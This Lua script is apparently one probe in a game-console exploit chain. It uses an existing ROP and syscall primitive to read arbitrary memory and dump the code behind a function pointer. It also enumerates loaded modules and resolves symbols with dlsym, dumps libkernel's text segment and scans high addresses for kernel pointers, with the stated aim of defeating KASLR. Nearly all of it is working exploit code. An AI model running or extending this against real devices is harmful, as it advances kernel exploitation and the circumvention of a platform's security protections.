-- CRASH_CLASS: MODERATE (reading code at fn_addr target)
-- PROBE 42g: Dump fn_addr target code + dlsym with correct handles
--
-- fn_addr value is 0x9FE5_10A60130 — NOT in libkernel text range.
-- Need to understand where this code lives and what it does.
-- If it contains kernel call addresses, we defeat KASLR.

print("=== PROBE 42g: FN_ADDR ANALYSIS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(588)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

--------------------------------------------------------------------
-- A) Get fn_addr value and read code at that address
--------------------------------------------------------------------
print("")
print("=== A: FN_ADDR CODE DUMP ===")
do
    local pipe_str = tostring(syscall.pipe)
    local fn_addr_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
    local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")

    if fn_addr_str then
        print("fn_addr ptr: " .. fn_addr_str)
        print("ropchain: " .. (rop_str or "?"))

        -- Allocate GPU mmap
        local gpu_size = 512 * 0x4000
        local gpu_addr
        pcall(function()
            gpu_addr = sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33),
                uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
        end)

        if gpu_addr then
            local fn_ptr = uint64(fn_addr_str)
            local fn_val = safe_rq(fn_ptr)

            if fn_val then
                local fh, fl = get_hi_lo(fn_val)
                print(string.format("fn_addr value: %08X_%08X", fh, fl))

                -- Try to read code at fn_val address
                print("")
                print("code at fn_addr target:")
                local fn_target = uint64(fn_val)
                local readable = false
                for off = 0, 0x78, 8 do
                    local q = safe_rq(fn_target + off)
                    if q then
                        local qh, ql = get_hi_lo(q)
                        print(string.format("  +%02X: %08X_%08X", off, qh, ql))
                        readable = true

                        -- Check if any qword looks like a kernel address
                        if qh >= 0xFFFF8000 then
                            print("    *** KERNEL ADDRESS IN CODE ***")
                        end
                    else
                        if not readable then
                            print("  +00: NOT READABLE")
                        end
                        break
                    end
                end

                if not readable then
                    -- Try with pcall around individual bytes
                    print("  trying byte-level read:")
                    local bytes = {}
                    for i = 0, 31 do
                        local ok, b = pcall(function()
                            return memory.read_byte(fn_target + i)
                        end)
                        if ok then
                            bytes[#bytes+1] = string.format("%02X", to_num(b))
                        else
                            bytes[#bytes+1] = "??"
                            break
                        end
                    end
                    print("  " .. table.concat(bytes, " "))
                end
            end

            pcall(function() sc_munmap(gpu_addr, uint64(gpu_size)) end)
        end
    end
end

--------------------------------------------------------------------
-- B) Enumerate ALL module handles and try dlsym on each
--------------------------------------------------------------------
print("")
print("=== B: DLSYM WITH ALL HANDLES ===")
do
    local sc_dgl = make_syscall(592)
    local sc_dgi = make_syscall(593)
    local sc_dlsym = make_syscall(594)

    local handles = memory.alloc(256)
    local num_buf = memory.alloc(8)
    pcall(function() sc_dgl(handles, 64, num_buf) end)
    local num = safe_rd(num_buf) or 0
    print("module count: " .. num)

    local sym_name = memory.alloc(64)
    local addr_out = memory.alloc(8)

    -- Try dlsym with handle 0 first (global/default)
    local test_syms = {
        "sceKernelGetCurrentCpu",
        "getpid",
        "printf",
        "sceKernelSendNotificationRequest",
        "__error",
    }

    -- Try handle 0 (global)
    for _, sym in ipairs(test_syms) do
        for i = 1, #sym do memory.write_byte(sym_name+(i-1), string.byte(sym, i)) end
        memory.write_byte(sym_name + #sym, 0)
        safe_wq(addr_out, uint64(0))
        local ok, ret = pcall(function()
            return sc_dlsym(uint64(0), uint64(sym_name), uint64(addr_out))
        end)
        local rv = ok and to_num(ret) or -999
        if rv == 0 then
            local addr = safe_rq(addr_out)
            if addr then
                local h, l = get_hi_lo(addr)
                print(string.format("  global: %s = %08X_%08X", sym, h, l))
            end
        end
    end

    -- Try each loaded module handle
    for i = 0, math.min(num - 1, 15) do
        local handle = safe_rd(handles + i * 4)
        if handle and handle > 0 then
            -- Get module name
            local info = memory.alloc(0x200)
            for j = 0, 0x1F, 4 do safe_wd(info+j, 0) end
            safe_wd(info, 0x160)
            local ok_n = pcall(function() sc_dgi(uint64(handle), info) end)
            local mname = ""
            if ok_n then
                for j = 0, 31 do
                    local b = safe_rd(info + 8 + j)
                    if b then b = b % 256
                        if b >= 0x20 and b < 0x7F then mname = mname .. string.char(b)
                        elseif b == 0 then break end
                    end
                end
            end

            -- Try dlsym on this handle
            local sym = "__error"
            for j = 1, #sym do memory.write_byte(sym_name+(j-1), string.byte(sym, j)) end
            memory.write_byte(sym_name + #sym, 0)
            safe_wq(addr_out, uint64(0))
            local ok_d, dret = pcall(function()
                return sc_dlsym(uint64(handle), uint64(sym_name), uint64(addr_out))
            end)
            local drv = ok_d and to_num(dret) or -999
            if drv == 0 then
                local addr = safe_rq(addr_out)
                if addr then
                    local h, l = get_hi_lo(addr)
                    print(string.format("  h=%d(%s): __error = %08X_%08X", handle, mname, h, l))
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- C) Read libkernel text segment — first 0x80 bytes for analysis
--------------------------------------------------------------------
print("")
print("=== C: LIBKERNEL TEXT DUMP ===")
do
    local sc_dgi = make_syscall(593)
    local info = memory.alloc(0x200)
    for i = 0, 0x1F, 4 do safe_wd(info+i, 0) end
    safe_wd(info, 0x160)

    -- Use handle from dynlib_get_list (first module should be eboot=0)
    local sc_dgl = make_syscall(592)
    local handles = memory.alloc(256)
    local num_buf = memory.alloc(8)
    pcall(function() sc_dgl(handles, 64, num_buf) end)

    -- Find libkernel handle
    local num = safe_rd(num_buf) or 0
    local libk_handle = nil
    local libk_text = nil

    for i = 0, math.min(num-1, 39) do
        local handle = safe_rd(handles + i * 4)
        if handle then
            for j = 0, 0x1F, 4 do safe_wd(info+j, 0) end
            safe_wd(info, 0x160)
            local ok = pcall(function() sc_dgi(uint64(handle), info) end)
            if ok then
                local name = ""
                for j = 0, 15 do
                    local b = safe_rd(info + 8 + j)
                    if b then b = b % 256
                        if b >= 0x20 and b < 0x7F then name = name .. string.char(b)
                        elseif b == 0 then break end
                    end
                end
                if name:find("libkernel") then
                    libk_handle = handle
                    libk_text = safe_rq(info + 0x108)
                    break
                end
            end
        end
    end

    if libk_text then
        local lh, ll = get_hi_lo(libk_text)
        print(string.format("libkernel text: %08X_%08X (handle %d)", lh, ll, libk_handle or 0))

        -- Read first 0x80 bytes of libkernel .text
        print("first 128 bytes:")
        for off = 0, 0x78, 8 do
            local q = safe_rq(libk_text + off)
            if q then
                local qh, ql = get_hi_lo(q)
                print(string.format("  +%02X: %08X_%08X", off, qh, ql))
            end
        end

        -- Also check if fn_addr target is within libkernel
        local fn_str = tostring(syscall.pipe):match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
        if fn_str then
            local fn_ptr = uint64(fn_str)
            -- Need GPU mmap
            local gpu_size = 512 * 0x4000
            local ga
            pcall(function()
                ga = sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33),
                    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
            end)
            if ga then
                local fv = safe_rq(fn_ptr)
                if fv then
                    local fvh, fvl = get_hi_lo(fv)
                    -- Check distance from libkernel text
                    if fvh == lh then
                        local dist = fvl - ll
                        print(string.format("fn_addr is libkernel+0x%X", dist))
                    else
                        print(string.format("fn_addr %08X_%08X NOT in libkernel (%08X_%08X)",
                            fvh, fvl, lh, ll))
                    end
                end
                pcall(function() sc_munmap(ga, uint64(gpu_size)) end)
            end
        end
    else
        print("libkernel not found")
    end
end

--------------------------------------------------------------------
-- D) Scan for shared pages / VDSO in high userspace addresses
--------------------------------------------------------------------
print("")
print("=== D: HIGH VA SCAN ===")
do
    -- On FreeBSD, the shared page is near the top of userspace VA
    -- Try scanning around known high VA ranges
    local test_addrs = {
        {name="shared_page_1", addr=uint64("0x7FFFFFFFF000")},
        {name="shared_page_2", addr=uint64("0x7FFFFFFFB000")},
        {name="high_user_1", addr=uint64("0x800000000000")},
        {name="high_user_2", addr=uint64("0x3FFFFFFFFFF000")},
    }
    for _, t in ipairs(test_addrs) do
        local q = safe_rq(t.addr)
        if q then
            local qh, ql = get_hi_lo(q)
            local tag = ""
            if qh >= 0xFFFF8000 then tag = " KPTR!" end
            print(string.format("  %s: %08X_%08X%s", t.name, qh, ql, tag))
        else
            print(string.format("  %s: not readable", t.name))
        end
    end
end

print("")
print("=== PROBE 42g COMPLETE ===")
